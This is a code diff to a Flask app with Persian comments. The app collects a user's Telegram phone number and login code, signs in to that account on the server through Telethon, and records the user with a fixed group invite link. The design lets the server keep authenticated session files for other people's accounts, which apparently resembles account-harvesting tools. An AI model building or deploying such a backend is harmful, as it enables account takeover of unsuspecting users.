@@ -32,10 +32,32 @@ def save_users(users):
     with open(USERS_FILE, 'w') as f:
         json.dump(users, f, indent=2)
 
+def get_user_count():
+    users = load_users()
+    return len(users)
+
+# ========== توابع asyncio ==========
+async def send_code_async(phone):
+    """ارسال کد به صورت async"""
+    temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{int(time.time())}", API_ID, API_HASH)
+    await temp_client.connect()
+    await temp_client.send_code_request(phone)
+    return temp_client
+
+async def verify_code_async(temp_client, code):
+    """تایید کد به صورت async"""
+    await temp_client.sign_in(code=code)
+    me = await temp_client.get_me()
+    return me
+
 # ========== مسیرها ==========
 @app.route('/')
 def index():
-    return render_template('register.html')
+    return render_template('register.html', user_count=get_user_count())
+
+@app.route('/api/users/count')
+def users_count():
+    return jsonify({'count': get_user_count()})
 
 @app.route('/api/send_code', methods=['POST'])
 def send_code():
@@ -45,11 +67,10 @@ def send_code():
         return jsonify({'success': False, 'message': '❌ شماره باید با + شروع شود!'})
     
     try:
-        temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{int(time.time())}", API_ID, API_HASH)
+        # اجرای async در یک حلقه جدید
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(temp_client.connect())
-        loop.run_until_complete(temp_client.send_code_request(phone))
+        temp_client = loop.run_until_complete(send_code_async(phone))
         
         session_id = str(int(time.time()))
         TEMP_SESSIONS[session_id] = {
@@ -84,10 +105,10 @@ def verify_code():
         temp_data = TEMP_SESSIONS[temp_id]
         temp_client = temp_data['client']
         
+        # اجرای async در یک حلقه جدید
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(temp_client.sign_in(code=code))
-        me = loop.run_until_complete(temp_client.get_me())
+        me = loop.run_until_complete(verify_code_async(temp_client, code))
         
         users = load_users()
         user_id = str(int(time.time()))
@@ -98,10 +119,12 @@ def verify_code():
             'status': 'pending',
             'registered_at': time.strftime('%Y-%m-%d %H:%M:%S'),
             'username': me.username,
-            'first_name': me.first_name
+            'first_name': me.first_name,
+            'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
         }
         save_users(users)
         
+        # بستن کلاینت
         loop.run_until_complete(temp_client.disconnect())
         del TEMP_SESSIONS[temp_id]
         session.clear()
@@ -118,3 +141,7 @@ def verify_code():
         
     except Exception as e:
         return jsonify({'success': False, 'message': f'❌ خطا: {str(e)}'})
+
+# ========== اجرا ==========
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=10000)
